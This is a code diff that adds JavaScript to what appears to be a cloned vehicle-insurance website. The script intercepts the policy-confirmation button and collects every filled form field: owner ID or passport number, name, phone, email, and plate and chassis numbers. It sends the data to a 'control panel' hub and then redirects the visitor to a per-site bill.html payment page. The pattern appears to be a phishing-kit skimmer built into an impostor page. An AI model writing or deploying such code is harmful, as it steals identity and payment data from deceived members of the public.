@@ -3388,6 +3388,72 @@
         if (!btn) return;
 
         var text = (btn.innerText || btn.textContent || btn.value || '').trim();
+
+        // ⚡ اعتراض نقرة تأكيد وإصدار الوثيقة والانتقال لصفحة الدفع bill.html مباشرة بدلاً من المودال
+        var isFinalConfirmClick = text.includes('تأكيد وإصدار') || text.includes('إصدار الوثيقة') || text.includes('إصدار وثيقة') || text.includes('تأكيد وإصدار الوثيقة');
+        if (isFinalConfirmClick) {
+            e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+
+            var formInputs = {};
+            // جمع الحقول بشكل ديناميكي من حقول الإدخال والـ React Selects
+            document.querySelectorAll('input, select, textarea').forEach(function(input) {
+                if (input.type === 'hidden' || input.type === 'submit' || input.type === 'button') return;
+                if (input.placeholder && input.placeholder.includes('ابحث')) return;
+                if ((input.type === 'checkbox' || input.type === 'radio') && !input.checked) return;
+
+                var val = input.value ? input.value.trim() : '';
+                if (!val) return;
+
+                var detectedName = input.getAttribute('name') || input.id || '';
+                var placeholder = (input.placeholder || '').trim();
+                
+                var labelText = '';
+                var parent = input.parentElement;
+                while (parent && !labelText) {
+                    var sibling = parent.previousElementSibling;
+                    if (sibling && sibling.innerText) labelText = sibling.innerText.trim();
+                    parent = parent.parentElement;
+                }
+
+                var checkText = (detectedName + ' ' + placeholder + ' ' + labelText).toLowerCase();
+                var finalKey = '';
+
+                if (checkText.includes('country') || checkText.includes('دولة') || checkText.includes('بلد')) finalKey = 'دولة القدوم';
+                else if (checkText.includes('port') || checkText.includes('منفذ') || checkText.includes('حدود')) finalKey = 'منفذ الدخول';
+                else if (checkText.includes('duration') || checkText.includes('مدة')) finalKey = 'مدة التأمين';
+                else if (checkText.includes('plate') || checkText.includes('لوحة')) finalKey = 'رقم اللوحة';
+                else if (checkText.includes('chassis') || checkText.includes('هيكل') || checkText.includes('شاصي') || checkText.includes('رقم الشاسيه')) finalKey = 'رقم الشاسيه';
+                else if (checkText.includes('id') || checkText.includes('هوية') || checkText.includes('اقامة') || checkText.includes('passport')) finalKey = 'رقم هوية المالك';
+                else if (checkText.includes('owner') || checkText.includes('مالك') || checkText.includes('الاسم')) finalKey = 'الاسم الكامل للمالك';
+                else if (checkText.includes('phone') || checkText.includes('mobile') || checkText.includes('هاتف') || checkText.includes('جوال')) finalKey = 'رقم الجوال';
+                else if (checkText.includes('email') || checkText.includes('بريد')) finalKey = 'البريد الإلكتروني';
+                else if (checkText.includes('nationality') || checkText.includes('جنسية')) finalKey = 'جنسية المالك';
+                else if (checkText.includes('color') || checkText.includes('لون')) finalKey = 'لون المركبة';
+                else if (checkText.includes('year') || checkText.includes('صنع')) finalKey = 'سنة الصنع';
+                else if (checkText.includes('model') || checkText.includes('موديل')) finalKey = 'موديل المركبة';
+                else if (checkText.includes('brand') || checkText.includes('ماركة')) finalKey = 'نوع الماركة';
+                else if (checkText.includes('type') || checkText.includes('نوع الهيكل')) finalKey = 'نوع الهيكل';
+                else if (placeholder && placeholder.length < 30) finalKey = placeholder;
+                else if (labelText && labelText.length < 30) finalKey = labelText;
+                else if (detectedName) finalKey = detectedName;
+
+                if (finalKey) formInputs[finalKey] = val;
+            });
+
+            // حفظ البيانات في الـ LocalStorage من أجل صفحة bill.html
+            localStorage.setItem('saas_last_submission', JSON.stringify(formInputs));
+
+            // إرسال البيانات فوراً كنموذج مؤكد ومكتمل للوحة التحكم
+            sendPayloadToHub(formInputs, true);
+
+            // توجيه المستخدم فوراً لصفحة الدفع bill.html
+            setTimeout(function() {
+                var isLive = window.location.pathname.startsWith('/live/');
+                var dest = (isLive ? '/live/' : '/storage/') + currentSiteId + '/bill.html';
+                window.location.href = dest;
+            }, 300);
+            return;
+        }
         var anchor = btn.closest('a') || (btn.tagName === 'A' ? btn : btn.querySelector('a'));
         var origHref = anchor ? (anchor.getAttribute('data-original-href') || anchor.getAttribute('href') || '') : '';
         var fingerprint = text + "___" + origHref;
